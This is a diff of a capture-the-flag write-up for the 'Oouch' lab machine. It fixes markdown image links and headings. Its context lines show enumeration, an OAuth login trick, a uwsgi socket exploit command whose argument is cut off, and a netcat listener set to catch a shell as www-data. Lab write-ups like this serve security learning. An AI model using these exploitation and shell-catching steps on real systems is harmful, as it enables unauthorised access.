@@ -167,9 +167,9 @@ WebSte Enumeration
 
 After see in the website, The port `5000` is open, so we will `REGISTER` into account ,And after login we get ooucch   page 
 
-![](/assets/img/posts/oouch/signin.png]
+![signin](/assets/img/posts/oouch/signin.png)
 
-![](/assets/img/posts/oouch/4.png]
+![4](/assets/img/posts/oouch/4.png)
 
 
 We Fount Nothing Intresting  There so Go back to `Gobuster` start diging,
@@ -205,8 +205,7 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
 we got `outh`  dir
 
 
-![](/assets/img/posts/oouch/5.png]
-
+![5](/assets/img/posts/oouch/5.png)
 
 It reveals a new subdomain `consumer.oouch.htb` so Added it to `/etc/hosts`
 
@@ -214,7 +213,7 @@ When I open [`http://consumer.oouch.htb:5000/oauth/connect`](http://consumer.oou
 
 Once we go back to the connect page, we can authorize the application as follows.
 
-![](/assets/img/posts/oouch/6.png]
+![6](/assets/img/posts/oouch/6.png)
 
 after that we will log  as `qtc'
 
@@ -457,8 +456,8 @@ The `uwsgi.ini` file shows that a UNIX socket is used to communicate between the
     
     
     
- Exploiting uwsgi service
- ===========================
+ Exploit uwsgi service
+ ======================
   
   
 And the service `uwsgi` is running as `www-data`
@@ -679,8 +678,9 @@ qtc@aeb4525789d8:/tmp$ python exploit.py -m unix -u /tmp/uwsgi.socket -c "/tmp/n
 
 qtc@aeb4525789d8:/tmp
 ```
+
 Grab NutShell as www-data
----------------------------
+--------------------------
 
 ```bash
 qtc@oouch:~$ nc -nlvp 1234
